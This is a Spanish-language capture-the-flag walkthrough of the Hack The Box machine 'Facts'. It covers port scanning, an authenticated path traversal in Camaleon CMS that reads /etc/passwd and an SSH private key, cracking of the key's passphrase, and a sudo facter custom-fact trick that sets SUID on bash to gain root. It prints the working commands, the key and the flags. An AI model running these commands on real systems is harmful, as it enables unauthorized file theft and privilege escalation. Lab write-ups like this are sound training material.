![Facts](https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a0efb09d-2937-4e7c-bd04-ba2e4386b8b1.png)

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  pyhtb machine start Facts
[*] Resolving name 'Facts'...
[*] Starting machine ID 829...
[+] Start request sent successfully!
[*] Waiting for machine to boot...
[+] Machine is online! IP: 10.129.244.96
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  rustscan -a 10.129.244.96 --no-banner --ulimit 3000 -r 1-65535 -- -A -sCV -o Ports.txt
[~] Automatically increasing ulimit value to 3000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.244.96:22
Open 10.129.244.96:80
Open 10.129.244.96:54321
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sCV -o Ports.txt" on ip 10.129.244.96
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2026-11-24 14:51 CET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
Initiating Ping Scan at 14:51
Scanning 10.129.244.96 [4 ports]
Completed Ping Scan at 14:51, 0.35s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:51
Completed Parallel DNS resolution of 1 host. at 14:51, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:51
Scanning 10.129.244.96 [3 ports]
Discovered open port 80/tcp on 10.129.244.96
Discovered open port 22/tcp on 10.129.244.96
Discovered open port 54321/tcp on 10.129.244.96
Completed SYN Stealth Scan at 14:51, 0.33s elapsed (3 total ports)
Initiating Service scan at 14:51
Scanning 3 services on 10.129.244.96
Completed Service scan at 14:53, 98.73s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.129.244.96
Retrying OS detection (try #2) against 10.129.244.96
Initiating Traceroute at 14:53
Completed Traceroute at 14:53, 0.30s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:53
Completed Parallel DNS resolution of 2 hosts. at 14:53, 0.05s elapsed
DNS resolution of 2 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.244.96.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 7.94s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 1.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
Nmap scan report for 10.129.244.96
Host is up, received echo-reply ttl 63 (0.29s latency).
Scanned at 2026-11-24 14:51:31 CET for 115s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4dd7b28cd4df579ca42fdfc6e3012989 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3ad6b2f4abf6f48ac81b9453fdefb87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  unknown syn-ack ttl 62
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18EAFF797E04ED85
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 24 Nov 2026 13:51:38 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18EAFF797E04ED85</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Tue, 24 Nov 2026 13:51:39 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.93%I=7%D=11/24%Time=6B05966A%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nA
SF:ccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20ap
SF:plication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-
SF:age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x2
SF:0dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-
SF:Amz-Request-Id:\x2018EAFF797E04ED85\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2024\x20N
SF:ov\x202026\x2013:51:38\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20enco
SF:ding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x
SF:20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Re
SF:questId>18EAFF797E04ED85</RequestId><HostId>dd9025bab4ad464b049177c95eb
SF:6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,
SF:59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Tue,\x2024\x2
SF:0Nov\x202026\x2013:51:39\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSession
SF:Req,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 5.0 (94%), Linux 5.4 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/24%OT=22%CT=%CU=30280%PV=Y%DS=2%DC=T%G=N%TM=6B0596D6%P=x86_64-pc-linux-gnu)
SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 14.454 days (since Tue Nov 10 04:00:20 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   293.98 ms 10.10.14.1
2   294.13 ms 10.129.244.96

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:53
Completed NSE at 14:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.71 seconds
           Raw packets sent: 67 (4.640KB) | Rcvd: 42 (3.255KB)
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  echo '10.129.244.96 facts.htb' | tee -a /etc/hosts
10.129.244.96 facts.htb
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  feroxbuster -u http://facts.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://facts.htb/
 🚩  In-Scope Url          │ facts.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      124l      552w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      121l      443w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       11w      183c http://facts.htb/rss
200      GET      129l      132w     3508c http://facts.htb/sitemap
200      GET       69l      448w    30396c http://facts.htb/randomfacts/logopage2.png
200      GET       66l      519w    44082c http://facts.htb/randomfacts/primary-question-mark.png
404      GET        2l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      160l      721w    15004c http://facts.htb/animal-sweat
403      GET        7l       10w      162c http://facts.htb/randomfacts/
200      GET      178l      965w    21754c http://facts.htb/dolphin-fact
200      GET      160l      773w    15365c http://facts.htb/finland-happiest
404      GET      114l      371w     4836c http://facts.htb/fonts.googleapis.com/css
200      GET      271l     1166w    19187c http://facts.htb/search
200      GET      172l      925w    19677c http://facts.htb/dark-chocolate
404      GET      114l      371w     4836c http://facts.htb/fonts.googleapis.com/
200      GET      172l      889w    19556c http://facts.htb/cats-attachment
200      GET      172l      920w    19730c http://facts.htb/animal-ejected
200      GET      166l      833w    17324c http://facts.htb/anne-frank
200      GET      160l      733w    14975c http://facts.htb/cute-animals
200      GET      172l      913w    19727c http://facts.htb/first-impressions
200      GET        8l     2294w   169312c http://facts.htb/assets/themes/camaleon_first/assets/css/main-41052d2acf5add707cadf8d1c12a89a9daca83fb8178fdd5c9105dc6c566d25d.css
200      GET       64l      988w   206540c http://facts.htb/assets/camaleon_cms/image-not-found-fc3c0e66dc61abf74010e63ef65a2e23c4cb40a3320408f2711f82fdc22b503f.png
200      GET      281l     1177w    19593c http://facts.htb/page
200      GET     9958l    40904w   330571c http://facts.htb/assets/themes/camaleon_first/assets/js/main-2d9adb006939c9873a62dff797c5fc28dff961487a2bb550824c5bc6b8dbb881.js
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
```

<img width="942" height="890" alt="imagen" src="https://github.com/user-attachments/assets/73411e5d-4bc5-4b4a-9761-0df3ea0a0dbb" />


Creamos cuenta:
```
cibaism / cibaism
```

<img width="718" height="956" alt="imagen" src="https://github.com/user-attachments/assets/916100cc-49f3-40b2-a3eb-9ab0a0ee137a" />


Vemos que hay versiones y un CMS.

<img width="1520" height="860" alt="imagen" src="https://github.com/user-attachments/assets/415c194c-8131-481d-bc74-0b9744b4fb41" />


https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c

Ese aviso es un path traversal autenticado en Camaleon CMS 2.8.0: permite descargar archivos del servidor. La versión corregida es 2.8.2; el fallo lee archivos, pero por sí solo no ejecuta comandos.

1. Obtener token y cookie:
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  csrf=$(curl -sS -c ./facts.cookies http://facts.htb/admin/login | grep -oP 'name="authenticity_token" value="\K[^"]+')
```

2. Iniciar sesión:
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  curl -sS -b ./facts.cookies -c ./facts.cookies -o /dev/null --data-urlencode "authenticity_token=$csrf" --data-urlencode 'user[username]=cibaism' --data-urlencode 'user[password]=cibaism' http://facts.htb/admin/login
```

3. Leer archivos del sistema:
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  curl -sS -G -b ./facts.cookies --data-urlencode 'file=../../../etc/passwd' http://facts.htb/admin/media/download_private_file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  curl -sS -G -b ./facts.cookies --data-urlencode 'file=../../../home/william/user.txt' http://facts.htb/admin/media/download_private_file
f0872c2d68b2495bd35ef0c00420b265
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  curl -sS -G -b ./facts.cookies --data-urlencode 'file=../../../home/trivia/.ssh/id_ed25519' http://facts.htb/admin/media/download_private_file
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBNyQBWfn
IcQkF/EFDZgp++AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIAHkpqd9j3o37xLh
fYCAoOXOnjLfrl5d5XrPxymuAdXbAAAAoNRCKrpgF7Z6UBemPH5Gy9hGDOA3hjX6S+Wpww
qZIsVdPIRwtoTJQ//TsuqRnqUfj0MB64UmvAvTd8qTdTnZo9NTceiEYKU4lmMM4OSC85dT
RbDt538yRU8FVFJ3HbZUk6P3bU5HjPaEOqtefahtjl6MJHM7kVQ790HYTS8qJgnPyfGeiv
SoVnlywUkn11032SDxkur60xxmGS2JjhnduPU=
-----END OPENSSH PRIVATE KEY-----
```

Intentamos loguear con el certificado ssh de `Trivia`.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  chmod 600 id_rsa

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  ssh -i id_rsa -o StrictHostKeyChecking=no trivia@facts.htb 'id'
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

No se ha podido ya que el certificado tiene contraseña, vamos a intentar crackear la contraseña para poder acceder.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  ssh2john.py id_rsa > ssh.hash

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
dragonballz      (id_rsa)
1g 0:00:00:51 DONE (2026-11-24 17:51) 0.01949g/s 62.35p/s 62.35c/s 62.35C/s adriano..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Volvemos a intentar loguear.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Facts
╰─ >>  ssh -i id_rsa -o StrictHostKeyChecking=no trivia@facts.htb 'id'
Enter passphrase for key 'id_rsa':
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)
```

Ahora vamos a tratar de elevar privilegios. Para ello verificamos que permisos tenemos con sudo.
```sh
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Revisamos que opciones nos ofrece esta tool.
```sh
trivia@facts:~$ sudo /usr/bin/facter -h
Usage
=====

  facter [options] [query] [query] [...]

Options
=======
           [--color]                      Enable color output.
           [--no-color]                   Disable color output.
        -c [--config]                     The location of the config file.
           [--custom-dir]                 A directory to use for custom facts.
        -d [--debug]                      Enable debug output.
           [--external-dir]               A directory to use for external facts.
           [--hocon]                      Output in Hocon format.
        -j [--json]                       Output in JSON format.
        -l [--log-level]                  Set logging level. Supported levels are: none, trace, debug, info, warn, error, and fatal.
           [--no-block]                   Disable fact blocking.
           [--no-cache]                   Disable loading and refreshing facts from the cache
           [--no-custom-facts]            Disable custom facts.
           [--no-external-facts]          Disable external facts.
           [--no-ruby]                    Disable loading Ruby, facts requiring Ruby, and custom facts.
           [--trace]                      Enable backtraces for custom facts.
           [--verbose]                    Enable verbose (info) output.
           [--show-legacy]                Show legacy facts when querying all facts.
        -y [--yaml]                       Output in YAML format.
           [--strict]                     Enable more aggressive error reporting.
        -t [--timing]                     Show how much time it took to resolve each fact
           [--sequential]                 Resolve facts sequentially
           [--http-debug]                 Whether to write HTTP request and responses to stderr. This should never be used in production.
        -p [--puppet]                     Load the Puppet libraries, thus allowing Facter to load Puppet-specific facts.
        -v [--version]                    Print the version
           [--list-block-groups]          List block groups
           [--list-cache-groups]          List cache groups
        -h [--help]                       Help for all arguments
```

Vemos que está hecha en ruby la aplicación y podemos añadir scripts custom en directorios personalizados.
```sh
trivia@facts:~$ mkdir -p /tmp/facts_custom && printf '%s\n' 'Facter.add(:pwn) { setcode { system("chmod u+s /bin/bash"); "ok" } }' > /tmp/facts_custom/pwn.rb

trivia@facts:~$ sudo /usr/bin/facter --custom-dir /tmp/facts_custom pwn
ok

trivia@facts:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1740896 Mar  5  2025 /bin/bash

trivia@facts:~$ /bin/bash -p

bash-5.2$ id
uid=1000(trivia) gid=1000(trivia) euid=0(root) groups=1000(trivia)

bash-5.2$ whoami
root

bash-5.2$ cat /root/root.txt
94f2961a6c18822b263bda1c011fa37e
```
